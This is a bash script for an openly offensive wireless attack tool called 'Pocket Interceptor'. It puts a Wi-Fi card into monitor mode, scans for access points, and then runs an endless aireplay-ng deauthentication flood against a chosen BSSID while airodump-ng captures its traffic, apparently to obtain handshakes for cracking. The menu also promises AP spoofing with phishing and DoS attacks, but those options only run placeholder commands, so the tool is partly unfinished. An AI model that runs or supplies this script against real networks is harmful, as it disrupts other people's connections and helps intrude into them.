#!/bin/bash
intro(){
    clear
    echo "________            ______      _____"                                
    echo "___  __ \______________  /________  /_    "                           
    echo "__  /_/ /  __ \  ___/_  //_/  _ \  __/"                               
    echo "_  ____// /_/ / /__ _  ,<  /  __/ /_"                                 
    echo "/_/     \____/\___/ /_/|_| \___/\__/"                                 
    echo""                                                                     
    echo""                                                                     
    echo""                                                                     
    echo "________                             "                                
    echo "_/_____/                              "                               
    echo""                                                                     
    echo""                                                                                                                                    
    echo "________      _____                               _____              "
    echo "____  _/________  /_________________________________  /______________"
    echo " __  / __  __ \  __/  _ \_  ___/  ___/  _ \__  __ \  __/  __ \_  ___/"
    echo "__/ /  _  / / / /_ /  __/  /   / /__ /  __/_  /_/ / /_ / /_/ /  /    "
    echo "/___/  /_/ /_/\__/ \___//_/    \___/ \___/_  .___/\__/ \____//_/     "
    echo "                                          /_/                        "
    sleep 5
}



SELECTED_INTERFACE=""
MON_INTERFACE=""

DIRECTORTY=`pwd`

select_interface(){    
    clear

    # Obtener lista de interfaces de red disponibles
    INTERFACES=($(ip -o link show | awk -F': ' '{print $2}'))

     #Verifica si tiene interfaces activas
    if [ ${#INTERFACES[@]} -lt 1 ]; then
    echo "There's no active interfaces."
    exit 1
    fi

    # Mostrar las interfaces disponibles
    echo "Select a network interface:"
    for i in "${!INTERFACES[@]}"; do
        echo "$((i+1)). ${INTERFACES[i]}"
    done

    # Leer la selección del usuario
    read -p "Enter the interface wanted: " CHOICE

    # Validar la entrada
    if [[ ! "$CHOICE" =~ ^[0-9]+$ ]] || ((CHOICE < 1 || CHOICE > ${#INTERFACES[@]})); then
        echo "Selected interface not valid."
        exit 1
    fi

    # Obtener la interfaz seleccionada
    SELECTED_INTERFACE="${INTERFACES[CHOICE-1]}"

    if echo "$SELECTED_INTERFACE" | grep -q "mon"; then
        MON_INTERFACE=$SELECTED_INTERFACE
        
    fi

    
    if iwconfig "$SELECTED_INTERFACE" &>/dev/null; then
        echo "[✓] It's a wireless interface $SELECTED_INTERFACE"
    else
        echo "[✗] It isn't a wireless interface"
        exit 1
    fi
    
    SELECTED_INTERFACE="${SELECTED_INTERFACE//mon/}"
    sleep 2
}


monitor_mode(){

    if echo "$SELECTED_INTERFACE" | grep -q "mon"; then
        MON_INTERFACE=$SELECTED_INTERFACE
        echo "It's already in monitor mode"
        SELECTED_INTERFACE="${SELECTED_INTERFACE//mon/}"
        sleep 2

    else
        echo "[+] Activating monitor mode in $SELECTED_INTERFACE..."
        sudo airmon-ng start "$SELECTED_INTERFACE" &>/dev/null
        
        # Verificar si la interfaz en modo monitor se creó
        MON_INTERFACE="${SELECTED_INTERFACE}mon"
        if iwconfig "$MON_INTERFACE" &>/dev/null; then
            echo "[✓] Monitor mode activated in $MON_INTERFACE"
        else
            echo "[✗] Error: Monitor mode could not be activated"
            exit 1
        fi
        sleep 2
    fi
    
    
}

manager_mode(){
    
    if echo "$MON_INTERFACE" | grep -q "mon"; then
        echo "[+] Disabling monitor mode in $MON_INTERFACE..."
        
        sudo airmon-ng stop "$MON_INTERFACE" &>/dev/null

        if iwconfig "$SELECTED_INTERFACE" &>/dev/null; then
            echo "[✓] Manager mode activated in $SELECTED_INTERFACE"
        else
            echo "[✗] Failed to return to management mode"
            exit 1
        fi
        MON_INTERFACE=""
        sleep 2
    else
        echo "The interface is already in monitor mode"
        sleep 2
    fi
}

BSSID_VAR=""
CHANNEL_VAR=""
PRIVACY_VAR=""
CIPHER_VAR=""
AUTH_VAR=""
BEACONS_VAR=""
ESSID_VAR=""

select_wireless(){
    
    if [[ -z "$MON_INTERFACE" ]];then
        echo "Not in monitor mode"
        sleep 3    
    fi
        
        
    rm ./data_collected/network_dump/*
        
    if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
        # Estamos en un entorno gráfico
        x-terminal-emulator -e "sudo timeout 25 airodump-ng -w data_collected/network_dump/networks --output-format csv $MON_INTERFACE --ignore-negative-one"
    else
        # No hay entorno gráfico, ejecutarlo en la terminal actual
        sudo timeout 10 airodump-ng -w data_collected/network_dump/networks --output-format csv "$MON_INTERFACE" --ignore-negative-one
    fi

    if [[ ! -f "./data_collected/network_dump/networks-01.csv" ]];then
        echo "File csv with network not found"
        exit 1
    fi


    cd  ./data_collected/network_dump/
    FILE="networks-01.csv"

    #Borrar informacion que no nos interesa.
    sed -i '/Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs/,$d' $FILE

    # Declarar un array vacío
    declare -a NETWORKS

    # Contador de filas (ID)
    COUNT=0

    # Leer el archivo línea por línea usando 'process substitution'
    while IFS=',' read -r BSSID FirstSeen LastSeen Channel Speed Privacy Cipher Auth Power Beacons IV LAN_IP ID_Length ESSID Key; do
    # Solo almacenar hay algun campo con informacion, si todo es vacio no almazenara.
        if [[ -n "$BSSID" && -n "$Channel" && -n "$Privacy" && -n "$Cipher" && -n "$Auth" && -n "$Beacons" && -n "$ESSID" ]]; then
            # Guardar todos los datos en el array (para referencia interna)
            NETWORKS+=("$BSSID,$Channel,$Privacy,$Cipher,$Auth,$Beacons,$ESSID")

            # Formatear solo los datos a mostrar
            LINE=$(printf "%-20s %-18s %-10s %-7s %-10s" "$BSSID" "$ESSID" "$Privacy" "$Beacons" "$Cipher")

            # Mostrar en pantalla
            echo "$COUNT  $LINE"

            # Incrementar el contador
            COUNT=$((COUNT + 1))
        fi
    done < <(tail -n +2 "$FILE")  # Leer desde la segunda línea

    # Solicitar entrada del usuario
    read -p "Enter an ID number to view its information: " USER_ID

    # Mostrar la información correspondiente al ID
    if [[ $USER_ID =~ ^[0-9]+$ ]] && [[ $USER_ID -ge 1 ]] && [[ $USER_ID -lt ${#NETWORKS[@]} ]]; then
        echo "Selected complete information:"
        IFS=',' read -r BSSID Channel Privacy Cipher Auth Beacons ESSID <<< "${NETWORKS[$USER_ID]}"

        BSSID_VAR="$BSSID"
        CHANNEL_VAR="$Channel"
        PRIVACY_VAR="$Privacy"
        CIPHER_VAR="$Cipher"
        AUTH_VAR="$Auth"
        BEACONS_VAR="$Beacons"
        ESSID_VAR="$ESSID"

        echo "$BSSID_VAR $ESSID_VAR"

    else
        echo "invalid ID ."
    fi

    rm $FILE
        
    cd .. && cd ..

}

TIMEOUT=""

Deauther(){

    if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
        # Estamos en un entorno gráfico
        x-terminal-emulator -e " timeout $TIMEOUT aireplay-ng --deauth 0 -a $BSSID_VAR $MON_INTERFACE"
    else
        # No hay entorno gráfico, ejecutarlo en la terminal actual
        timeout $TIMEOUT aireplay-ng --deauth 0 -a $BSSID_VAR $MON_INTERFACE
    fi

}

Bruteforce(){
    
    if [[ -z "$BSSID_VAR" ]];then
        echo "There's not a BSSID in usage"
        exit 1
    fi

    if [[ -z "$CHANNEL_VAR" ]];then
        echo "There's not a Channel set in usage"
        exit 1
    fi

    if [[ -z "$MON_INTERFACE" ]];then
        echo "Interface it's not in monitor mode"
    fi
    read -p "Set a time to run the attack recomended at least 20. MIN 10 MAX 200" TIMEOUT_USR

    TIMEOUT=$TIMEOUT_USR

    if [[ $TIMEOUT =~ ^[0-9]+$ ]] && [[ $TIMEOUT -ge 10 ]] && [[ $TIMEOUT -lt 200 ]];then

         if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
            # Estamos en un entorno gráfico
            Deauther &
            x-terminal-emulator -e " timeout $TIMEOUT airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE"
        else
            # No hay entorno gráfico, ejecutarlo en la terminal actual
            Deauther &
            timeout $TIMEOUT airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE
        
            #############01:11:07  wlan0mon is on channel 14, but the AP uses channel 11#######
        fi
    
    else
        echo "Invalid Time number"
    fi

}

menu(){
   
    if ./install.sh; then
        select_interface
    else
        exit 1
    fi
    
    BOOL_SELECTION=true

    while $BOOL_SELECTION; do
        
        clear
        if [[ -z "$MON_INTERFACE" ]];then
            
            MODE=$(iwconfig "$SELECTED_INTERFACE" 2>/dev/null | grep -o 'Mode:[^ ]*' | cut -d: -f2)
            echo "You haved selected the interface: $SELECTED_INTERFACE  in Mode: $MODE"

        else
            MODE=$(iwconfig "$MON_INTERFACE" 2>/dev/null | grep -o 'Mode:[^ ]*' | cut -d: -f2)
            echo "You haved selected the interface: $MON_INTERFACE  in Mode: $MODE"
        fi

        if [[ -z "$BSSID_VAR" ]];then
            echo "You don't have any Wireless network selected"
        else
            echo "You have the wireless network $ESSID_VAR selected with the BSSID: $BSSID_VAR with the privacy type: $PRIVACY_VAR"
        fi

        echo ""
        echo "+-+-+-+-+ +-+-+-+-+-+-+-+-+-+-+-+"
        echo "|M|e|n|u| |I|n|t|e|r|c|e|p|t|o|r|"
        echo "+-+-+-+-+ +-+-+-+-+-+-+-+-+-+-+-+"
        echo ""
        echo "Network Configuration Menu"
        echo "- - - - - - - - - - - - - - - - - -"
        echo "0. Exit Scipt"
        echo "1. Change Network Interface"
        echo "2. Put Interface In Monitor Mode (Needed for wireless atacks)"
        echo "3. Put Interface In Manager Mode "    
        echo "4. Select wireless network "
        echo "- - - - - - - - - - - - - - - - - -"
        echo ""
        echo "Atacks Menu"
        echo "- - - - - - - - - - - - - - - - - -"
        echo "5. Deauther + Bruteforce (Get inside the Wireless network) "
        echo "6. Fake Capcha (Deauther + Ap Spofing + Phishing Login)"
        echo "7. DoS Attack (Stop the wireless conexions)"
        echo "8. Scan Network (Search Devices + Vulnerabilities)"
        echo "9. "
        echo "- - - - - - - - - - - - - - - - - -"
        echo ""
        echo ""
        read -p "Select the option you want: " SELECTION

        case $SELECTION in
            1) select_interface ;;
            2) monitor_mode;;
            3) manager_mode ;;
            4) select_wireless ;;
            5) Bruteforce ;;
            6) echo ""; hostname -I ;;
            7) echo ""; free -h ;;
            8) echo ""; uptime ;;
            9) echo ""; uname -r ;;
            0) echo "👋 Goodbye..."; exit 0 ;;
            *) echo "❌ Not valid option." ; sleep 2 ;;
        esac
    done

}





USERID=`id -u`

if [ $USERID == 0 ];then
    intro
    menu
else
	echo "Not executed as root"
fi
exit 1